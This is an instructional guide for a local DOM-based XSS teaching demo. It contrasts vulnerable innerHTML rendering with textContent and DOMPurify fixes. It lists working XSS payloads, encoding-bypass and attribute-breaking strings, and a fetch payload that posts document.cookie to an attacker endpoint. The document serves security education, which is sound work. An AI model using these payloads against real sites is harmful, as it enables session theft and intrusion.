# DOM XSS Exploit Instructions

## Overview
DOM-based XSS (Cross-Site Scripting) occurs when client-side JavaScript code processes user input in an unsafe way, allowing attackers to execute malicious scripts in the victim's browser.

## How to Use the DOM XSS Demo

### 1. Access the Application
- Make sure the application is running (both server and client)
- Navigate to: http://localhost:3000
- Click on "DOM-Based XSS" in the navigation

### 2. Understanding the Two Modes

#### Vulnerable Mode (⚠️ VULNERABLE)
- Shows how DOM XSS attacks work
- Uses `innerHTML` to directly inject user input
- Malicious scripts will execute

#### Secure Mode (🔒 SECURE)  
- Demonstrates proper security measures
- Uses `textContent` instead of `innerHTML`
- Malicious scripts are neutralized

### 3. Testing DOM XSS Attacks

#### Method 1: Using the Built-in Payloads
1. In the DOM XSS page, you'll see a list of exploit payloads
2. Click the "Use" button next to any payload
3. The page will reload with the payload in the URL
4. Observe the results in both modes

#### Method 2: Manual URL Manipulation
Add payloads directly to the URL:

**Hash-based attacks:**
```
http://localhost:3000/dom#<script>alert(1)</script>
http://localhost:3000/dom#<img src=x onerror=alert(2)>
http://localhost:3000/dom#<svg onload=alert(3)>
```

**Query parameter attacks:**
```
http://localhost:3000/dom?name=<script>alert(1)</script>
http://localhost:3000/dom?name=<img src=x onerror=alert(2)>
```

### 4. Example Attack Scenarios

#### Basic Alert Attack
```
URL: http://localhost:3000/dom#<script>alert('XSS')</script>
Result: Shows alert popup in vulnerable mode
```

#### Cookie Theft Simulation
```
URL: http://localhost:3000/dom#<script>alert(document.cookie)</script>
Result: Displays cookies in vulnerable mode
```

#### Data Exfiltration Attack
```
URL: http://localhost:3000/dom#<script>fetch("/attacker/log",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({type:"cookie",data:document.cookie})})</script>
Result: Attempts to send cookies to attacker endpoint
```

#### Event Handler Attack
```
URL: http://localhost:3000/dom#<img src=x onerror=alert('Event handler XSS')>
Result: Executes when image fails to load
```

### 5. Observing the Results

#### In Vulnerable Mode:
- Scripts execute immediately
- Alerts appear
- Malicious code runs in browser context
- Red border indicates danger
- Logs show "⚠️ EXECUTED"

#### In Secure Mode:
- Scripts are rendered as plain text
- No execution occurs
- Green border indicates safety
- Logs show "🛡️ BLOCKED"
- Protection method is displayed

### 6. Understanding the Security Fixes

#### Primary Fix: textContent vs innerHTML
```javascript
// VULNERABLE - allows HTML parsing and script execution
element.innerHTML = userInput

// SECURE - treats input as plain text
element.textContent = userInput
```

#### Alternative Fix: DOMPurify Sanitization
```javascript
// SECURE - removes malicious code while allowing safe HTML
const sanitized = DOMPurify.sanitize(userInput, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong'],
  ALLOWED_ATTR: []
})
element.innerHTML = sanitized
```

### 7. Real-World Attack Vectors

#### Social Engineering
- Attacker sends malicious URL via email/chat
- Victim clicks link thinking it's legitimate
- Malicious script executes in victim's browser

#### Reflected in Search Results
- Search functionality that reflects query in URL
- Attacker crafts malicious search URL
- Victim searches and script executes

#### URL Shortener Abuse
- Attacker uses URL shortener to hide malicious payload
- Victim clicks shortened link
- Full malicious URL loads and executes

### 8. Prevention Best Practices

1. **Use textContent over innerHTML** when displaying user input
2. **Sanitize with DOMPurify** if HTML rendering is required
3. **Validate and encode** URL parameters
4. **Implement CSP headers** to block inline scripts
5. **Use URL encoding** for special characters
6. **Avoid eval()** and similar dangerous functions
7. **Validate on both client and server** sides

### 9. Testing Checklist

- [ ] Test with script tags
- [ ] Test with event handlers (onerror, onload, onclick)
- [ ] Test with iframe javascript: URLs
- [ ] Test with SVG and image tags
- [ ] Test both hash (#) and query (?) parameters
- [ ] Verify logs show correct protection status
- [ ] Confirm secure mode blocks all payloads
- [ ] Test URL encoding bypass attempts

### 10. Advanced Testing

#### Encoding Bypass Attempts
```
# URL encoded
%3Cscript%3Ealert(1)%3C/script%3E

# Double encoding
%253Cscript%253Ealert(1)%253C/script%253E

# HTML entities
&lt;script&gt;alert(1)&lt;/script&gt;
```

#### Context Breaking
```
# Breaking out of attributes
" onmouseover="alert(1)

# Breaking out of script context
</script><script>alert(1)</script>
```

## Conclusion

This DOM XSS demo shows the critical difference between vulnerable and secure code. The key takeaway is that any user input processed by client-side JavaScript must be properly sanitized or handled using safe methods like `textContent` instead of `innerHTML`.

Always remember: **Never trust user input, especially in client-side code.**